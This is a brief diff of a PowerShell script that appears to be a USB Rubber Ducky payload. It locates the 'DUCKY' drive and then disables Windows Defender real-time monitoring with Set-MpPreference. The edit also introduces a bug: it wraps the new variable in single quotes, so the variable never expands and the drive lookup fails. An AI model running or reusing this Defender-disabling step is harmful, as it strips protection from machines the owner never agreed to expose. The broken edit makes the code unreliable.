@@ -1,5 +1,6 @@
 # Set destination directory
-$duckletter = (Get-CimInstance -ClassName Win32_LogicalDisk | Where-Object { $_.VolumeName -eq 'DUCKY' }).DeviceID
+$DUCKY_DRIVE_NAME = "DUCKY" 
+$duckletter = (Get-CimInstance -ClassName Win32_LogicalDisk | Where-Object { $_.VolumeName -eq '$DUCKY_DRIVE_NAME' }).DeviceID
 Set-Location $duckletter
 
 Set-MpPreference -DisableRealtimeMonitoring $true
